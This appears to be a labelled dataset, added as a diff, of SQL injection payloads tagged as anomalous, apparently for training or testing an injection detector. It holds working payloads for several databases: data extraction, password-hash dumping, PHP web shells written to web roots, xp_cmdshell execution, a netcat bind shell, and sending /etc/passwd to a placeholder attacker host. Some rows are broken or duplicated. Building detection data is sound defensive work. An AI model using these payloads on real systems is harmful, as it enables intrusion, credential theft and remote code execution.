@@ -1,0 +1,1818 @@
+"(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))",sqli,anom
+"'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'",sqli,anom
+"AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-",sqli,anom
+"AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--",sqli,anom
+"AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--",sqli,anom
+"AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--",sqli,anom
+"AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--",sqli,anom
+"' and updatexml(null,concat(0x0a,version()),null)-- -",sqli,anom
+"' and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -",sqli,anom
+"?id=1 AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--",sqli,anom
+"?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--",sqli,anom
+"?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--",sqli,anom
+"?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--",sqli,anom
+"?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--",sqli,anom
+"convert(int,@@version)",sqli,anom
+cast((SELECT @@version) as int),sqli,anom
+"' + convert(int,@@version) + '",sqli,anom
+' + cast((SELECT @@version) as int) + ',sqli,anom
+SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual,sqli,anom
+"SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual",sqli,anom
+"SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual",sqli,anom
+"SELECT to_char(dbms_xmlgen.getxml('select ""'||(select user from sys.dual)||'"" FROM sys.dual')) FROM dual",sqli,anom
+"SELECT rtrim(extract(xmlagg(xmlelement(""s"", username || ',')),'/s').getstringval(),',') FROM all_users",sqli,anom
+",cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)",sqli,anom
+",cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--",sqli,anom
+",cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name='data_table'+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--",sqli,anom
+",cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)",sqli,anom
+"' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1",sqli,anom
+' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1,sqli,anom
+' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1,sqli,anom
+' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1,sqli,anom
+SELECT name FROM master..sysdatabases,sqli,anom
+SELECT name FROM Injection..sysobjects WHERE xtype = 'U',sqli,anom
+SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users'),sqli,anom
+"SELECT  UserId, UserName from Users",sqli,anom
+"1' UNION SELECT 1,2,3--+",sqli,anom
+"1' UNION SELECT @,@,@--+",sqli,anom
+SELECT @@version WHERE @@version LIKE '%12.0.2000.8%',sqli,anom
+"WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)",sqli,anom
+SELECT message FROM data WHERE row = 1 and message like 't%',sqli,anom
+"?id=1 and substring(version(),1,1)=5",sqli,anom
+"?id=1 and right(left(version(),1),1)=5",sqli,anom
+"?id=1 and left(version(),1)=4",sqli,anom
+"?id=1 and ascii(lower(substr(Version(),1,1)))=51",sqli,anom
+"?id=1 and (select mid(version(),1,1)=4)",sqli,anom
+"?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'",sqli,anom
+"?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'",sqli,anom
+"2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2",sqli,anom
+"2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2",sqli,anom
+"AND MAKE_SET(YOLO<(SELECT(length(version()))),1)",sqli,anom
+"AND MAKE_SET(YOLO<ascii(substring(version(),POS,1)),1)",sqli,anom
+"AND MAKE_SET(YOLO<(SELECT(length(concat(login,password)))),1)",sqli,anom
+"AND MAKE_SET(YOLO<ascii(substring(concat(login,password),POS,1)),1)",sqli,anom
+SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';,sqli,anom
+SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';,sqli,anom
+SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual),sqli,anom
+SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table);,sqli,anom
+SELEC COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE';,sqli,anom
+SELEC message FROM log_table WHERE rownum=1 AND message LIKE 't%';,sqli,anom
+ProductID=1;waitfor delay '0:0:10'--,sqli,anom
+ProductID=1);waitfor delay '0:0:10'--,sqli,anom
+ProductID=1';waitfor delay '0:0:10'--,sqli,anom
+ProductID=1');waitfor delay '0:0:10'--,sqli,anom
+ProductID=1));waitfor delay '0:0:10'--,sqli,anom
+IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]',sqli,anom
+"+BENCHMARK(40000000,SHA1(1337))+",sqli,anom
+"'%2Bbenchmark(3200,SHA1(1))%2B'",sqli,anom
+"AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))  //SHA1",sqli,anom
+RLIKE SLEEP([SLEEPTIME]),sqli,anom
+"OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))",sqli,anom
+1 and (select sleep(10) from dual where database() like '%')#,sqli,anom
+1 and (select sleep(10) from dual where database() like '___')# ,sqli,anom
+1 and (select sleep(10) from dual where database() like '____')#,sqli,anom
+1 and (select sleep(10) from dual where database() like '_____')#,sqli,anom
+1 and (select sleep(10) from dual where database() like 'a____')#,sqli,anom
+1 and (select sleep(10) from dual where database() like 's____')#,sqli,anom
+1 and (select sleep(10) from dual where database() like 'sa___')#,sqli,anom
+1 and (select sleep(10) from dual where database() like 'sw___')#,sqli,anom
+1 and (select sleep(10) from dual where database() like 'swa__')#,sqli,anom
+1 and (select sleep(10) from dual where database() like 'swb__')#,sqli,anom
+1 and (select sleep(10) from dual where database() like 'swi__')#,sqli,anom
+"1 and (select sleep(10) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%pass%' limit 0,1) like '%')#",sqli,anom
+"?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1)))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --",sqli,anom
+"?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1)))>=100, 1, SLEEP(3)) --",sqli,anom
+"?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2",sqli,anom
+"AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])",sqli,anom
+AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])),sqli,anom
+"AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))     ",sqli,anom
+ATTACH DATABASE '/var/www/lol.php' AS lol;,sqli,anom
+CREATE TABLE lol.pwn (dataz text);,sqli,anom
+INSERT INTO lol.pwn (dataz) VALUES ('<?system($_GET['cmd']); ?>');--     ,sqli,anom
+SELECT @@version,sqli,anom
+SELECT DB_NAME(),sqli,anom
+SELECT name FROM master..sysdatabases;,sqli,anom
+"SELECT DB_NAME(N); — for N = 0, 1, 2, …",sqli,anom
+SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘mytable’); — for the current DB only,sqli,anom
+"SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable",sqli,anom
+"SELECT table_catalog, column_name FROM information_schema.columns",sqli,anom
+"SELECT name, password FROM master..sysxlogins",sqli,anom
+"SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins (Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.)",sqli,anom
+"SELECT name, password_hash FROM master.sys.sql_logins",sqli,anom
+SELECT name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins,sqli,anom
+ProductID=1; DROP members--,sqli,anom
+"EXEC xp_cmdshell ""net user"";",sqli,anom
+EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';,sqli,anom
+EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';,sqli,anom
+"EXEC sp_configure 'show advanced options',1;",sqli,anom
+RECONFIGURE;,sqli,anom
+"EXEC sp_configure 'xp_cmdshell',1;",sqli,anom
+RECONFIGURE;,sqli,anom
+sqsh -S 192.168.1.X -U sa -P superPassword,sqli,anom
+python mssqlclient.py WORKGROUP/Administrator:password@192.168.1X -port 46758,sqli,anom
+1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';-- ,sqli,anom
+"EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;",sqli,anom
+1' ORDER BY 1--+,sqli,anom
+1' ORDER BY 2--+,sqli,anom
+1' ORDER BY 3--+,sqli,anom
+1' ORDER BY 4--+,sqli,anom
+1' GROUP BY 1--+,sqli,anom
+1' GROUP BY 2--+,sqli,anom
+1' GROUP BY 3--+,sqli,anom
+1' GROUP BY 4--+,sqli,anom
+1' UNION SELECT @--+       ,sqli,anom
+"1' UNION SELECT @,@--+ ",sqli,anom
+"1' UNION SELECT @,@,@--+ ",sqli,anom
+"1' LIMIT 1,1 INTO @--+  ",sqli,anom
+"1' LIMIT 1,1 INTO @,@--+ ",sqli,anom
+"1' LIMIT 1,1 INTO @,@,@--+ ",sqli,anom
+1' AND (SELECT * FROM Users) = 1--+ ,sqli,anom
+"UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata",sqli,anom
+"UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...",sqli,anom
+"UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...",sqli,anom
+"UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...",sqli,anom
+ProductID=1; DROP members--,sqli,anom
+"EXEC xp_cmdshell ""net user"";",sqli,anom
+EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';,sqli,anom
+EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';,sqli,anom
+"EXEC sp_configure 'show advanced options',1;",sqli,anom
+RECONFIGURE;,sqli,anom
+"EXEC sp_configure 'xp_cmdshell',1;",sqli,anom
+RECONFIGURE;,sqli,anom
+sqsh -S 192.168.1.X -U sa -P superPassword,sqli,anom
+python mssqlclient.py WORKGROUP/Administrator:password@192.168.1X -port 46758,sqli,anom
+1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';-- ,sqli,anom
+"EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;",sqli,anom
+?id=(1)and(SELECT * from db.users)=(1),sqli,anom
+"?id=1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)",sqli,anom
+-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b)a,sqli,anom
+-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a,sqli,anom
+"-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a",sqli,anom
+"select `4` from (select 1,2,3,4,5,6 union select * from users)dbname;",sqli,anom
+"MariaDB [dummydb]> select author_id,title from posts where author_id=-1 union select 1,(select concat(`3`,0x3a,`4`) from (select 1,2,3,4,5,6 union select * from users)a limit 1,1);",sqli,anom
+"(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#",sqli,anom
+"(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#",sqli,anom
+"make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)",sqli,anom
+"(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)",sqli,anom
+"(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@))",sqli,anom
+"(Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))",sqli,anom
+"+make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)",sqli,anom
+"(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)",sqli,anom
+"+concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f",sqli,anom
+"+concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20,version(),0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c2f66",sqli,anom
++/*!13337concat*/(0x3c616464726573733e3c63656e7465723e3c62723e3c68313e3c666f6e7420636f6c6f723d22526564223e496e6a6563746564206279204e315a344d3c2f666f6e743e3c68313e3c2f63656e7465723e3c62723e3c666f6e7420636f6c6f723d2223663364393361223e4461746162617365207e3e3,sqli,anom
+"(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)",sqli,anom
+"union SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #",sqli,anom
+"union select 1,(select(@)from(select(@:=0x00),(select(@)from(information_schema.processlist)where(@)in(@:=concat(@,0x3C62723E,state,0x3a,info))))a),3,4 #",sqli,anom
+' UNION ALL SELECT LOAD_FILE('/etc/passwd') --,sqli,anom
+GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#,sqli,anom
+"[...] UNION SELECT ""<?php system($_GET['cmd']); ?>"" into outfile ""C:\\xampp\\htdocs\\backdoor.php""",sqli,anom
+[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>',sqli,anom
+"[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -",sqli,anom
+"[...] union all select 1,2,3,4,""<?php echo shell_exec($_GET['cmd']);?>"",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'",sqli,anom
+"[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'",sqli,anom
+[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';,sqli,anom
+`username` varchar(20) not null,sqli,anom
+/usr/lib/lib_mysqludf_sys.so,sqli,anom
+SELECT sys_eval('id');,sqli,anom
+select @@version into outfile '\\\\192.168.0.100\\temp\\out.txt';,sqli,anom
+select @@version into dumpfile '\\\\192.168.0.100\\temp\\out.txt,sqli,anom
+"select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));",sqli,anom
+"select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874))",sqli,anom
+select load_file('\\\\error\\abc');,sqli,anom
+select load_file(0x5c5c5c5c6572726f725c5c616263);,sqli,anom
+select 'osanda' into dumpfile '\\\\error\\abc';,sqli,anom
+select 'osanda' into outfile '\\\\error\\abc';,sqli,anom
+load data infile '\\\\error\\abc' into table database.table_name;,sqli,anom
+SELECT user FROM dual UNION SELECT * FROM v$version,sqli,anom
+SELECT global_name FROM global_name;,sqli,anom
+SELECT name FROM V$DATABASE;,sqli,anom
+SELECT instance_name FROM V$INSTANCE;,sqli,anom
+SELECT SYS.DATABASE_NAME FROM DUAL;,sqli,anom
+SELECT DISTINCT owner FROM all_tables;,sqli,anom
+SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';,sqli,anom
+SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo';,sqli,anom
+SELECT table_name FROM all_tables;,sqli,anom
+"SELECT owner, table_name FROM all_tables;",sqli,anom
+"SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';",sqli,anom
+"AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])",sqli,anom
+"BEGIN EXECUTE IMMEDIATE 'create or replace and compile java source named ""PwnUtil"" as import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = """";while ((stemp = myReader.readLine()) != null) str += stemp + ""\n"";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = """";while((stemp = myReader.readLine()) != null) str += stemp + ""\n"";myReader.close();return str;} catch (Exception e){ return e.toString();}}};'; END;",sqli,anom
+BEGIN EXECUTE IMMEDIATE 'create or replace function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name ''PwnUtil.runCmd(java.lang.String) return String'';'; END;,sqli,anom
+SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;,sqli,anom
+SELECT TO_CHAR(dbms_xmlquery.getxml('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c61636520616e6420636f6d70696c65206a61766120736f75726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e2a3b7075626c696320636c6173732070776e7574696c7b7075626c69632073746174696320537472696e672072756e28537472696e672061726773297b7472797b4275666665726564526561646572206d726561643d6e6577204275666665726564526561646572286e657720496e70757453747265616d5265616465722852756e74696d652e67657452756e74696d6528292e657865632861726773292e676574496e70757453747265616d282929293b20537472696e67207374656d702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e6528292920213d6e756c6c29207374722b3d7374656d702b225c6e223b206d726561642e636c6f736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b72657475726e20652e746f537472696e6728293b7d7d7d''));,sqli,anom
+EXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c6163652066756e6374696f6e2050776e5574696c46756e6328705f636d6420696e207661726368617232292072657475726e207661726368617232206173206c616e6775616765206a617661206e616d65202770776e7574696c2e72756e286a6176612e6c616e672e537472696e67292072657475726e20537472696e67273b'')); end;')) results FROM dual,sqli,anom
+SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;,sqli,anom
+SELECT version(),sqli,anom
+SELECT user;,sqli,anom
+SELECT current_user;,sqli,anom
+SELECT session_user;,sqli,anom
+SELECT usename FROM pg_user;,sqli,anom
+SELECT getpgusername();,sqli,anom
+SELECT usename FROM pg_user,sqli,anom
+"SELECT usename, passwd FROM pg_shadow",sqli,anom
+SELECT usename FROM pg_user WHERE usesuper IS TRUE,sqli,anom
+"SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user",sqli,anom
+SELECT current_database(),sqli,anom
+SELECT datname FROM pg_database,sqli,anom
+SELECT table_name FROM information_schema.tables,sqli,anom
+SELECT column_name FROM information_schema.columns WHERE table_name='data_table',sqli,anom
+"' and substr(version(),1,10) = 'PostgreSQL' and '1  -> OK",sqli,anom
+"' and substr(version(),1,10) = 'PostgreXXX' and '1  -> KO",sqli,anom
+AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])),sqli,anom
+"AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))",sqli,anom
+http://host/vuln.php?id=injection';create table NotSoSecure (data varchar(200));--,sqli,anom
+select pg_ls_dir('./');,sqli,anom
+"select pg_read_file('PG_VERSION', 0, 200);",sqli,anom
+CREATE TABLE temp(t TEXT);,sqli,anom
+COPY temp FROM '/etc/passwd';,sqli,anom
+SELECT * FROM temp limit 1 offset 0;,sqli,anom
+CREATE TABLE pentestlab (t TEXT);,sqli,anom
+INSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash');,sqli,anom
+SELECT * FROM pentestlab;,sqli,anom
+COPY pentestlab(t) TO '/tmp/pentestlab';,sqli,anom
+DROP TABLE IF EXISTS cmd_exec; ,sqli,anom
+CREATE TABLE cmd_exec(cmd_output text);,sqli,anom
+COPY cmd_exec FROM PROGRAM 'id';,sqli,anom
+SELECT * FROM cmd_exec;,sqli,anom
+DROP TABLE IF EXISTS cmd_exec;,sqli,anom
+"CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;",sqli,anom
+SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');,sqli,anom
+select sqlite_version();      ,sqli,anom
+SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%',sqli,anom
+SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name',sqli,anom
+"SELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'')),""TEXT"",''),""INTEGER"",''),""AUTOINCREMENT"",''),""PRIMARY KEY"",''),""UNIQUE"",''),""NUMERIC"",''),""REAL"",''),""BLOB"",''),""NOT NULL"",''),"","",'~~') FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'",sqli,anom
+and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) < number_of_table,sqli,anom
+and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=table_name_length_number,sqli,anom
+"and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) > hex('some_char')",sqli,anom
+"AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))",sqli,anom
+ATTACH DATABASE '/var/www/lol.php' AS lol;,sqli,anom
+CREATE TABLE lol.pwn (dataz text);,sqli,anom
+INSERT INTO lol.pwn (dataz) VALUES ('<?system($_GET['cmd']); ?>');--,sqli,anom
+"UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--",sqli,anom
+',sqli,anom
+27%,sqli,anom
+"
+%22
+#
+%23
+;
+%3B
+)
+Wildcard (*)
+&apos; 
+%%2727
+%25%27
+`+HERP
+'||'DERP
+'+'herp
+' 'DERP
+'%20'HERP
+'%2B'HERP
+page.asp?id=1 or 1=1
+page.asp?id=1' or 1=1
+page.asp?id=1 or 1=1",sqli,anom
+page.asp?id=1 and 1=2,sqli,anom
+Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was,sqli,anom
+"transformed into U+0022 QUOTATION MARK ("")",sqli,anom
+Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was,sqli,anom
+transformed into U+0027 APOSTROPHE ('),sqli,anom
+"[""conv('a',16,2)=conv('a',16,2)""                   ,""MYSQL""],",sqli,anom
+"[""connection_id()=connection_id()""                 ,""MYSQL""],",sqli,anom
+"[""crc32('MySQL')=crc32('MySQL')""                   ,""MYSQL""],",sqli,anom
+"[""BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)""       ,""MSSQL""],",sqli,anom
+"[""@@CONNECTIONS>0""                                 ,""MSSQL""],",sqli,anom
+"[""@@CONNECTIONS=@@CONNECTIONS""                     ,""MSSQL""],",sqli,anom
+"[""@@CPU_BUSY=@@CPU_BUSY""                           ,""MSSQL""],",sqli,anom
+"[""USER_ID(1)=USER_ID(1)""                           ,""MSSQL""],",sqli,anom
+"[""ROWNUM=ROWNUM""                                   ,""ORACLE""],",sqli,anom
+"[""RAWTOHEX('AB')=RAWTOHEX('AB')""                   ,""ORACLE""],",sqli,anom
+"[""LNNVL(0=123)""                                    ,""ORACLE""],",sqli,anom
+"[""5::int=5""                                        ,""POSTGRESQL""],",sqli,anom
+"[""5::integer=5""                                    ,""POSTGRESQL""],",sqli,anom
+"[""pg_client_encoding()=pg_client_encoding()""       ,""POSTGRESQL""],",sqli,anom
+"[""get_current_ts_config()=get_current_ts_config()"" ,""POSTGRESQL""],",sqli,anom
+"[""quote_literal(42.5)=quote_literal(42.5)""         ,""POSTGRESQL""],",sqli,anom
+"[""current_database()=current_database()""           ,""POSTGRESQL""],",sqli,anom
+"[""sqlite_version()=sqlite_version()""               ,""SQLITE""],",sqli,anom
+"[""last_insert_rowid()>1""                           ,""SQLITE""],",sqli,anom
+"[""last_insert_rowid()=last_insert_rowid()""         ,""SQLITE""],",sqli,anom
+"[""val(cvar(1))=1""                                  ,""MSACCESS""],",sqli,anom
+"[""IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0""               ,""MSACCESS""],",sqli,anom
+"[""cdbl(1)=cdbl(1)""                                 ,""MSACCESS""],",sqli,anom
+"[""1337=1337"",   ""MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL""],",sqli,anom
+"[""'i'='i'"",     ""MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL""],",sqli,anom
+'-',sqli,anom
+' ',sqli,anom
+'&',sqli,anom
+'^',sqli,anom
+'*',sqli,anom
+' or 1=1 limit 1 -- -+,sqli,anom
+"'=""or'",sqli,anom
+' or ''-',sqli,anom
+' or '' ',sqli,anom
+' or ''&',sqli,anom
+' or ''^',sqli,anom
+' or ''*',sqli,anom
+'-||0',sqli,anom
+-||0,sqli,anom
+-,sqli,anom
+ ,sqli,anom
+&,sqli,anom
+^,sqli,anom
+*,sqli,anom
+" or ""-",sqli,anom
+" or "" ",sqli,anom
+" or ""&",sqli,anom
+" or ""^",sqli,anom
+" or ""*",sqli,anom
+or true--,sqli,anom
+" or true--
+' or true--
+) or true--",sqli,anom
+') or true--,sqli,anom
+' or 'x'='x,sqli,anom
+') or ('x')=('x,sqli,anom
+')) or (('x'))=(('x,sqli,anom
+" or x""=""x",sqli,anom
+") or (x"")=(""x",sqli,anom
+")) or ((x""))=((""x",sqli,anom
+or 2 like 2,sqli,anom
+or 1=1,sqli,anom
+or 1=1--,sqli,anom
+or 1=1#,sqli,anom
+or 1=1/*,sqli,anom
+admin' --,sqli,anom
+admin' -- -,sqli,anom
+admin' #,sqli,anom
+admin'/*,sqli,anom
+admin' or '2' LIKE '1,sqli,anom
+admin' or 2 LIKE 2--,sqli,anom
+admin' or 2 LIKE 2#,sqli,anom
+admin') or 2 LIKE 2#,sqli,anom
+admin') or 2 LIKE 2--,sqli,anom
+admin') or ('2' LIKE '2,sqli,anom
+admin') or ('2' LIKE '2'#,sqli,anom
+admin') or ('2' LIKE '2'/*,sqli,anom
